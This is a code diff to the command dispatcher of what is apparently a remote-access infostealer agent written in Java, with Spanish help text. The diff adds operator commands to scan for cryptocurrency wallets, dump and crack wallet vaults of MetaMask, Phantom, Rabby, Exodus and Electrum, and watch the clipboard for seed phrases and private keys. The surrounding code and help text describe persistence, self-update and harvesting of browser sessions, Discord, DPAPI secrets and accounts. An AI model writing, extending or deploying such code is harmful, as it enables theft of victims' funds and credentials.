@@ -69,6 +69,12 @@ public final class CommandExecutor {
 				case "ping" -> ping(message);
 				case "gateway" -> poller.gatewayCommand(args);
 				case "update" -> update(args);
+				case "scan_wallets" -> cryptoScan(args);
+				case "dump_vault" -> cryptoDump(args);
+				case "crack_vault" -> cryptoCrack(args);
+				case "clip_start" -> poller.submitCrypto("clip_start", Map.of(), 30);
+				case "clip_stop" -> poller.submitCrypto("clip_stop", Map.of(), 30);
+				case "crypto" -> poller.reply(poller.cryptoStatus());
 				case "kill" -> {
 					poller.reply("Closing agent");
 					markIntent(UpdateHelper.ACTION_STOP);
@@ -80,6 +86,39 @@ public final class CommandExecutor {
 			Log.debug("Command failed", throwable);
 			poller.reply("Failed: " + throwable.getMessage());
 		}
+	}
+
+	private void cryptoScan(List<String> args) {
+		Map<String, Object> params = new java.util.LinkedHashMap<>();
+		params.put("include_desktop", !args.contains("--ext-only"));
+		params.put("include_extensions", !args.contains("--desktop-only"));
+		params.put("include_seeds", !args.contains("--no-seeds"));
+		poller.reply(poller.submitCrypto("scan_wallets", params, 180));
+	}
+
+	private void cryptoDump(List<String> args) {
+		if (args.size() < 2) {
+			poller.reply("Usage: dump_vault <metamask|phantom|rabby|exodus|electrum>");
+			return;
+		}
+		poller.reply(poller.submitCrypto("dump_vault", Map.of("target", args.get(1).toLowerCase()), 300));
+	}
+
+	private void cryptoCrack(List<String> args) {
+		if (args.size() < 2) {
+			poller.reply("Usage: crack_vault <target> [seconds]");
+			return;
+		}
+		int seconds = 90;
+		if (args.size() > 2) {
+			try {
+				seconds = Integer.parseInt(args.get(2));
+			} catch (NumberFormatException ignored) {
+				// default
+			}
+		}
+		poller.reply(poller.submitCrypto("crack_vault",
+			Map.of("target", args.get(1).toLowerCase(), "max_seconds", seconds), seconds + 60));
 	}
 
 	private void help() {
@@ -98,6 +137,7 @@ public final class CommandExecutor {
 			"Los secretos copiados (seed BIP39, xprv, clave EVM/Solana o contraseña de un gestor) se avisan solos con `clip secrets on`, por defecto activo.",
 			"Agente: `persist on|off` tarea de logon · `sleep <s>` · `update [check|stage|apply <version>|rollback|auto on|off|status]` · `gateway status|restart` · `clear [1-1000]` mensajes del canal · `kill` cierra el agente",
 			"Harvest: accounts, browsers, Discord, wallets, DPAPI y game. La primera ejecución ya envía recon, sesiones y carteras; `hives` es el fallback manual.",
+			"Cripto/API: `scan_wallets` · `dump_vault <target>` · `crack_vault <target> [s]` · `clip_start` · `clip_stop` · `crypto` estado\n",
 			"Extras y reparaciones: SHELL.md en el repo.");
 	}
 
